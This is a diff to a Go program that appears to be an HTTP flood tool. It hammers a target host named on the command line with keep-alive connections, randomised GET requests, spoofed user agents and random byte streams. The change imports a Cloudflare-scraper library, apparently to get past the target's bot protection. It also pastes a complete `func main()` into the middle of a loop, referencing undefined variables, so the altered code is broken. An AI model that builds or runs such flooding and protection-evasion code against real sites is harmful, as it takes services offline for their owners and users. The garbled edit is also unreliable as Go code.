@@ -19,6 +19,7 @@ import (
 	"strconv"
 	"sync"
 	"time"
+	"github.com/cardigann/go-cloudflare-scraper"
 )
 
 //Start of Random useragent
@@ -169,7 +170,7 @@ func main() {
 					return
 				}
 				if s, ok := s.(*net.TCPConn); ok {
-					s.SetNoDelay(true)
+					s.SetNoDelay(false)
 				}
 				err = s.(*net.TCPConn).SetKeepAlive(true)
 				if err != nil {
@@ -216,7 +217,7 @@ func main() {
 				}
 				defer conn.Close()
 				for {
-					buffer := make([]byte, 256)
+					buffer := make([]byte, 128)
 					rand.Read(buffer)
 					if stop > 0 {
 						break
@@ -258,12 +259,31 @@ func main() {
 					if s, ok := s.(*net.TCPConn); ok {
 						s.SetNoDelay(true)
 					}
+					func main() {
+	scraper, err := scraper.NewTransport(http.DefaultTransport)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	c := http.Client{Transport: scraper}
+
+	res, err := c.Get(ts.URL)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	body, err = ioutil.ReadAll(res.Body)
+	res.Body.Close()
+	if err != nil {
+		log.Fatal(err)
+	}
+} 
 					defer s.Close()
 					payload := " HTTP/1.1\r\nHost: " + os.Args[1] + "\r\nConnection: Keep-Alive\r\nUser-Agent: " + useragent() + "\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n\r\n"
 					for t := 0; t < 140; t++ {
 						s.SetDeadline(time.Now().Add(time.Duration(timeout) * time.Second))
 						url := "GET /?" + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + strconv.Itoa(rand.Intn(10000)) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) + string(str[rand.Intn(len(str))]) //random url                                                                                                                                                                                                                                                                    // big buffer
-						tmp := make([]byte, 256)                                                                                                                                                                                                                                                                          // using small tmo buffer for demonstrating
+						tmp := make([]byte, 512)                                                                                                                                                                                                                                                                          // using small tmo buffer for demonstrating
 						s.Write([]byte(url + payload))
 						count++
 						_, err := s.Read(tmp)
